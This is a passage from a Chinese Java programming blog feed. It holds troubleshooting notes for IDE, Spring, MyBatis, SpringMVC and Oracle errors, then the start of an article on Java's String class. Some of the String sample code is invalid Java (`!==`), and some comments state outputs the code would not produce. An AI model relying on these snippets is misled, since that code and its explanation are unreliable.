<code>.git/config</code> 文件，加入下面的代码：<pre class="line-numbers language-none"><code class="language-none">[branch "master"]  remote = origin  merge = refs/heads/master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="参考：-3"><a href="#参考：-3" class="headerlink" title="参考："></a>参考：</h4><p><a href="http://stackoverflow.com/questions/4847101/git-which-is-the-default-configured-remote-for-branch">StackOverFlow</a></p><br>## IntelliJ IDEA<h3 id="java-Compilation-failed-internal-java-compiler-error"><a href="#java-Compilation-failed-internal-java-compiler-error" class="headerlink" title="java: Compilation failed: internal java compiler error"></a>java: Compilation failed: internal java compiler error</h3><h4 id="错误提示：-1"><a href="#错误提示：-1" class="headerlink" title="错误提示："></a>错误提示：</h4><p><img src="http://wx3.sinaimg.cn/mw690/a6e9cb00ly1fgrfd1loxcj20yg04wdm9.jpg" alt="错误提示"></p><h4 id="报错原因：-9"><a href="#报错原因：-9" class="headerlink" title="报错原因："></a>报错原因：</h4><ul><li>代码中使用了高版本的 Java 特性，而项目的编译器版本低于该版本，导致无法编译。</li></ul><h4 id="解决办法：-10"><a href="#解决办法：-10" class="headerlink" title="解决办法："></a>解决办法：</h4><ul><li>设置项目的编译器版本高于等于支持该特性的 Java 版本</li></ul><p><img src="http://wx1.sinaimg.cn/mw690/a6e9cb00ly1fgrfgso7ktj21kw14dqaa.jpg" alt="错误提示"></p><blockquote><p>此设置只是表明了该项目支持的最低 JDK 版本，与项目中用到的 JDK 无关。</p></blockquote><br>## Eclipse<h3 id="An-internal-error-occurred-during-“Launching-Project”-Java-lang-NullPointerException"><a href="#An-internal-error-occurred-during-“Launching-Project”-Java-lang-NullPointerException" class="headerlink" title="An internal error occurred during: “Launching Project”. Java.lang.NullPointerException."></a>An internal error occurred during: “Launching Project”. Java.lang.NullPointerException.</h3><h4 id="错误提示：-2"><a href="#错误提示：-2" class="headerlink" title="错误提示："></a>错误提示：</h4><p><img src="http://wx4.sinaimg.cn/mw690/a6e9cb00ly1ffyhhppv7kj20aa07jdfx.jpg" alt="错误提示"></p><h4 id="报错原因：-10"><a href="#报错原因：-10" class="headerlink" title="报错原因："></a>报错原因：</h4><ul><li>我的报错原因大概是写代码的时候突然断电，笔记本上没有电池，开机之后就这样了</li></ul><h4 id="解决办法：-11"><a href="#解决办法：-11" class="headerlink" title="解决办法："></a>解决办法：</h4><ol><li>退出 eclipse</li><li>进入 eclipse 的工作区间</li><li>删除 .metadata 文件夹，确保 .metadata 文件夹得隐藏文件也要删除</li><li>重启 eclipse，并重新导入你的工程</li><li>常用设置也被还原了，记得改回来…TAT</li></ol><br>## Framework<h3 id="Spring-java-lang-IllegalArgumentException"><a href="#Spring-java-lang-IllegalArgumentException" class="headerlink" title="Spring: java.lang.IllegalArgumentException"></a>Spring: java.lang.IllegalArgumentException</h3><h4 id="错误提示：-3"><a href="#错误提示：-3" class="headerlink" title="错误提示："></a>错误提示：</h4><pre class="line-numbers language-none"><code class="language-none">java.lang.IllegalArgumentException    at org.springframework.asm.ClassReader.&lt;init&gt;(Unknown Source)    at org.springframework.asm.ClassReader.&lt;init&gt;(Unknown Source)    at org.springframework.asm.ClassReader.&lt;init&gt;(Unknown Source)    at org.springframework.core.type.classreading.SimpleMetadataReader.&lt;init&gt;(SimpleMetadataReader.java:52)    at org.springframework.core.type.classreading.SimpleMetadataReaderFactory.getMetadataReader(SimpleMetadataReaderFactory.java:80)    at org.springframework.core.type.classreading.CachingMetadataReaderFactory.getMetadataReader(CachingMetadataReaderFactory.java:101)    at org.springframework.core.type.classreading.SimpleMetadataReaderFactory.getMetadataReader(SimpleMetadataReaderFactory.java:76)    at org.springframework.context.annotation.ConfigurationClassParser.getImports(ConfigurationClassParser.java:298)    at org.springframework.context.annotation.ConfigurationClassParser.getImports(ConfigurationClassParser.java:300)    at org.springframework.context.annotation.ConfigurationClassParser.getImports(ConfigurationClassParser.java:300)    at org.springframework.context.annotation.ConfigurationClassParser.doProcessConfigurationClass(ConfigurationClassParser.java:230)    at org.springframework.context.annotation.ConfigurationClassParser.processConfigurationClass(ConfigurationClassParser.java:153)    at org.springframework.context.annotation.ConfigurationClassParser.parse(ConfigurationClassParser.java:130)    at org.springframework.context.annotation.ConfigurationClassPostProcessor.processConfigBeanDefinitions(ConfigurationClassPostProcessor.java:285)    at org.springframework.context.annotation.ConfigurationClassPostProcessor.postProcessBeanDefinitionRegistry(ConfigurationClassPostProcessor.java:223)    at org.springframework.context.support.AbstractApplicationContext.invokeBeanFactoryPostProcessors(AbstractApplicationContext.java:630)    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:461)    at org.springframework.web.context.ContextLoader.configureAndRefreshWebApplicationContext(ContextLoader.java:383)    at org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:283)    at com.demo.web.listener.InitApplicationListener.contextInitialized(InitApplicationListener.java:32)    at org.apache.catalina.core.StandardContext.listenerStart(StandardContext.java:4729)    at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5167)    at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)    at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:725)    at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:701)    at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:717)    at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:945)    at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1768)    at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)    at java.util.concurrent.FutureTask.run(FutureTask.java:266)    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)at java.lang.Thread.run(Thread.java:745)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="报错原因：-11"><a href="#报错原因：-11" class="headerlink" title="报错原因："></a>报错原因：</h4><p>ASM 与 JDK 8 不兼容</p><h4 id="解决办法：-12"><a href="#解决办法：-12" class="headerlink" title="解决办法："></a>解决办法：</h4><p>如果你想继续使用 JDK 8 的话，需要使用 Spring 4.0 或更高版本。</p><h4 id="参考：-4"><a href="#参考：-4" class="headerlink" title="参考："></a>参考：</h4><p><a href="http://blog.csdn.net/sgls652709/article/details/49878741">CSDN</a></p><br><h3 id="Mybatis-org-apache-ibatis-binding-BindingException"><a href="#Mybatis-org-apache-ibatis-binding-BindingException" class="headerlink" title="Mybatis: org.apache.ibatis.binding.BindingException"></a>Mybatis: org.apache.ibatis.binding.BindingException</h3><h4 id="错误信息："><a href="#错误信息：" class="headerlink" title="错误信息："></a>错误信息：</h4><p>org.apache.ibatis.binding.BindingException: Invalid bound statement (not found)</p><h4 id="报错原因：-12"><a href="#报错原因：-12" class="headerlink" title="报错原因："></a>报错原因：</h4><ul><li>这个问题，通常是由 Mapper interface 和对应的 xml 文件的定义对应不上引起的，这时就需要仔细检查对比包名、xml 中的 namespace、接口中的方法名称等是否对应。</li></ul><h4 id="解决办法：-13"><a href="#解决办法：-13" class="headerlink" title="解决办法："></a>解决办法：</h4><ol><li>检查 xml 文件所在 package 名称是否和 Mapper interface 所在的包名一一对应；</li><li>检查 xml 的 namespace 是否和 xml 文件的 package 名称一一对应；</li><li>检查方法名称是否对应；</li><li>去除 xml 文件中的中文注释；</li><li>随意在 xml 文件中加一个空格或者空行然后保存。</li></ol><h4 id="参考：-5"><a href="#参考：-5" class="headerlink" title="参考："></a>参考：</h4><p><a href="http://blog.csdn.net/softwarehe/article/details/8889206">mybatis 绑定错误</a></p><br><h3 id="SpringMVC-java-lang-IllegalStateException-getOutputStream-has-already-been-called-for-this-response"><a href="#SpringMVC-java-lang-IllegalStateException-getOutputStream-has-already-been-called-for-this-response" class="headerlink" title="SpringMVC: java.lang.IllegalStateException: getOutputStream() has already been called for this response"></a>SpringMVC: java.lang.IllegalStateException: getOutputStream() has already been called for this response</h3><h4 id="报错信息：-7"><a href="#报错信息：-7" class="headerlink" title="报错信息："></a>报错信息：</h4><pre class="line-numbers language-none"><code class="language-none">七月 05, 2017 9:27:36 下午 org.apache.catalina.core.ApplicationDispatcher invoke严重: Servlet.service() for servlet jsp threw exceptionjava.lang.IllegalStateException: getOutputStream() has already been called for this response    at org.apache.catalina.connector.Response.getWriter(Response.java:662)    at org.apache.catalina.connector.ResponseFacade.getWriter(ResponseFacade.java:213)    at javax.servlet.ServletResponseWrapper.getWriter(ServletResponseWrapper.java:104)    at org.apache.jasper.runtime.JspWriterImpl.initOut(JspWriterImpl.java:125)    at org.apache.jasper.runtime.JspWriterImpl.flushBuffer(JspWriterImpl.java:118)    at org.apache.jasper.runtime.PageContextImpl.release(PageContextImpl.java:186)    at org.apache.jasper.runtime.JspFactoryImpl.internalReleasePageContext(JspFactoryImpl.java:125)    at org.apache.jasper.runtime.JspFactoryImpl.releasePageContext(JspFactoryImpl.java:79)    at org.apache.jsp.jsp.product.productList_jsp._jspService(productList_jsp.java:678)    at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)    at javax.servlet.http.HttpServlet.service(HttpServlet.java:731)    at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439)    at org.apache.jasper.servlet.JspServlet._serviceJspFile(JspServlet.java:395)    at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java)    at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339)    at javax.servlet.http.HttpServlet.service(HttpServlet.java:731)    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)    at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:743)    at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:603)    at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:542)    at org.springframework.web.servlet.view.InternalResourceView.renderMergedOutputModel(InternalResourceView.java:160)    at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:303)    at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1286)    at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1041)    at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:984)    at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901)    at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970)    at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:872)    at javax.servlet.http.HttpServlet.service(HttpServlet.java:650)    at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)    at javax.servlet.http.HttpServlet.service(HttpServlet.java:731)    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)    at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)    at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:197)    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)    at org.apache.catalina.core.StandardContextValve.__invoke(StandardContextValve.java:110)    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java)    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:506)    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:962)    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:445)    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1115)    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:637)    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:316)    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)    at java.lang.Thread.run(Thread.java:748)七月 05, 2017 9:27:36 下午 org.apache.catalina.core.StandardWrapperValve invoke严重: Servlet.service() for servlet [SpringMVC] in context with path [] threw exception [java.lang.IllegalStateException: getOutputStream() has already been called for this response] with root causejava.lang.IllegalStateException: getOutputStream() has already been called for this response    at org.apache.catalina.connector.Response.getWriter(Response.java:662)    at org.apache.catalina.connector.ResponseFacade.getWriter(ResponseFacade.java:213)    at javax.servlet.ServletResponseWrapper.getWriter(ServletResponseWrapper.java:104)    at org.apache.jasper.runtime.JspWriterImpl.initOut(JspWriterImpl.java:125)    at org.apache.jasper.runtime.JspWriterImpl.flushBuffer(JspWriterImpl.java:118)    at org.apache.jasper.runtime.PageContextImpl.release(PageContextImpl.java:186)    at org.apache.jasper.runtime.JspFactoryImpl.internalReleasePageContext(JspFactoryImpl.java:125)    at org.apache.jasper.runtime.JspFactoryImpl.releasePageContext(JspFactoryImpl.java:79)    at org.apache.jsp.jsp.product.productList_jsp._jspService(productList_jsp.java:678)    at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)    at javax.servlet.http.HttpServlet.service(HttpServlet.java:731)    at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439)    at org.apache.jasper.servlet.JspServlet._serviceJspFile(JspServlet.java:395)    at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java)    at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339)    at javax.servlet.http.HttpServlet.service(HttpServlet.java:731)    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)    at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:743)    at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:603)    at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:542)    at org.springframework.web.servlet.view.InternalResourceView.renderMergedOutputModel(InternalResourceView.java:160)    at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:303)    at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1286)    at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1041)    at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:984)    at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901)    at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970)    at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:872)    at javax.servlet.http.HttpServlet.service(HttpServlet.java:650)    at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)    at javax.servlet.http.HttpServlet.service(HttpServlet.java:731)    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)    at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)    at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:197)    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:218)    at org.apache.catalina.core.StandardContextValve.__invoke(StandardContextValve.java:110)    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java)    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:506)    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:962)    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:445)    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1115)    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:637)    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:316)    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)    at java.lang.Thread.run(Thread.java:748)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="报错原因：-13"><a href="#报错原因：-13" class="headerlink" title="报错原因："></a>报错原因：</h4><ol><li>HTTP 的基本原则：一个请求，一个响应。你只能将一件事送回请求。HTML 页面或 PDF 文档或图像等。如果您已经获得了输入/输出流，则 Java 会抱怨，因为你应该只获取其中的一个。</li><li>在 &lt;% 或 %&gt; 后面有空格或空行</li></ol><p>我遇到的是第一种。</p><h4 id="解决办法：-14"><a href="#解决办法：-14" class="headerlink" title="解决办法："></a>解决办法：</h4><ol><li>我属于第一种情况，下载文件的 action 在文件下载后又返回了一个 boolean 值到请求，导致该问题。我将该方法的返回类型更改为 void 后问题解决。参考 <a href="https://stackoverflow.com/questions/25909657/java-lang-illegalstateexception-getoutputstream-has-already-been-called-for-t">stackoverflow</a></li><li>第二种我没遇到，<a href="https://stackoverflow.com/questions/1776142/getoutputstream-has-already-been-called-for-this-response">stackoverflow 上的回答</a>：<br>Ok, you should be using a servlet not a JSP but if you really need to… add this directive at the top of your page:</li></ol><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page trimDirectiveWhitespaces="true" %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Or in the jsp-config section your web.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jsp-config</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jsp-property-group</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>*.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>trim-directive-whitespaces</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>trim-directive-whitespaces</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jsp-property-group</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jsp-config</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Also flush/close the OutputStream and return when done.</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">dataOutput<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dataOutput<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><h3 id="SQL-Developer-连接-Oracle-数据库被拒绝"><a href="#SQL-Developer-连接-Oracle-数据库被拒绝" class="headerlink" title="SQL Developer 连接 Oracle 数据库被拒绝"></a>SQL Developer 连接 Oracle 数据库被拒绝</h3><h4 id="报错信息：-8"><a href="#报错信息：-8" class="headerlink" title="报错信息："></a>报错信息：</h4><ul><li>状态: 失败 -测试失败: Listener refused the connection with the following error:<br>ORA-12505, TNS:listener does not currently know of SID given in connect descriptor.</li></ul><h4 id="报错原因：-14"><a href="#报错原因：-14" class="headerlink" title="报错原因："></a>报错原因：</h4><ul><li>服务器是集群的，所以连接属性上不能选择 sid，而应该选择「服务名」。</li></ul><h4 id="解决办法：-15"><a href="#解决办法：-15" class="headerlink" title="解决办法："></a>解决办法：</h4><ul><li>将连接属性改成「服务名」，如图：<br><img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1finmzwhm4jj215o0na78c.jpg" alt="新建/修改数据库连接"></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待完善 </tag>
            
            <tag> bug </tag>
            
            <tag> 调试 </tag>
            
            <tag> 错误 </tag>
            
            <tag> 异常 </tag>
            
            <tag> Issues </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入了解 String</title>
      <link href="/2017/03/14/shen-ru-liao-jie-string/"/>
      <url>/2017/03/14/shen-ru-liao-jie-string/</url>
      
        <content type="html"><![CDATA[<p>String 类型几乎是除了 8 种<a href="/2017/02/20/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/">基本数据类型</a>外最常用的数据类型，深入的了解 String 类型可以更好地帮助我们写代码。</p><span id="more"></span><h2 id="String-的概念"><a href="#String-的概念" class="headerlink" title="String 的概念"></a>String 的概念</h2><p>Java 字符串就是 Unicode 字符序列。在标准 Java 类库中提供了一个预定义类，就是 java.lang.String ，<strong>每个用双引号括起来的字符串都是 String 类的一个实例</strong>。</p><blockquote><p>java.lang 包中的类，可以不用导入，直接使用</p></blockquote><ul><li>java.lang.String 类使用了 final 修饰，所以** String 类不能被继承**。</li><li><strong>String 类的底层实际上就是字符数组，以及对字符数组的一系列操作。</strong></li><li>字符串无论是中文还是英文，每个字符对应都是两个字节的定长编码。</li></ul><br>### 字符串的拼接<ul><li>Java 允许使用 + 号链接（拼接）两个字符串。</li><li>当将一个字符串与一个非字符串的值进行拼接时，后者将被转换成字符串</li></ul><blockquote><p>任何一个 Java 对象都可以转换成字符串</p></blockquote><br>### 空串与 null<ul><li><strong>空串 “” 是长度为 0 的字符串。</strong>也叫空字符串。</li><li>空串是一个 Java 对象，有自己的长度（0）和内容（空）</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出为 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>判断字符串是否为空的两个方法：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">//或</span><span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>null 表示没有任何对象与该变量关联（<strong>String 类型是引用类型，不是基本类型</strong>）</li></ul><p>判断一个字符串是否为 null：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其实更常见的是检查一个字符串既不是 null 也不为空：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>str <span class="token operator">!=</span><span class="token operator">=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果 str 为 null 时，调用 str.length()会报空指针异常<br>所以<strong>这里一定要先检查是否为 null</strong><br>因为 &amp;&amp; 和 || 运算符是“短路”运算，前面的表达式已经能够出结果了，则不会再计算后面的表达式<br>所以这里即使 str 为空，也就不会报空指针异常</p></blockquote><br>## String 常量池：String 类没有提供用于修改字符串的方法，所以在 Java 文档中将 **String 类对象称为 `不可变字符串` ，字符串一旦创建，永远无法改变，但字符串的引用可以重新赋值。重新赋值意味着一旦改变则一定创建一个新的对象。**这样会大大降低修改字符串的效率，但是不可变字符串有个优点：**编译器可以让字符串 `共享` 在 `常量池` 中**。<blockquote><p>当使用字面量创建字符对象时，JVM 会重用之前创建过的对象。<br>每当使用字面量创建对象时，JVM 会首先查看常量池中是否含有该字符串存在;<br>若有则直接使用（不用创建对象），否则创建对象并缓存到常量池中供下次使用。<br>当使用 “+” 拼接全部为字面量的字符串进行赋值时，JVM 会自动优化，它会直接用拼接结果去常量池中查找是否创建过该对象。</p></blockquote><p><strong>Java 建议使用字面量创建对象字符，以减少内存开销</strong>，String 代码示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> s1 <span class="token operator">=</span> <span class="token string">"abc"</span><span class="token punctuation">;</span><span class="token comment">//常量池暂时没有 "abc"，所以这里会创建一个新对象</span><span class="token class-name">String</span> s2 <span class="token operator">=</span> <span class="token string">"abc"</span><span class="token punctuation">;</span><span class="token comment">//首先去常量池查找，所以不会创建新对象</span><span class="token class-name">String</span> s3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建了新对象，使用 new 关键字不会缓存到常量池当中</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"s1 == s2 ? "</span> <span class="token operator">+</span> s1 <span class="token operator">==</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 true，因为引用同样的地址</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"s1 == s3 ? "</span> <span class="token operator">+</span> s1 <span class="token operator">==</span> s3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 false，因为地址不同</span>s1 <span class="token operator">=</span> s1 <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token comment">//只要改变，一定创建新对象</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"s1 == s2 ? "</span> <span class="token operator">+</span> s1 <span class="token operator">==</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 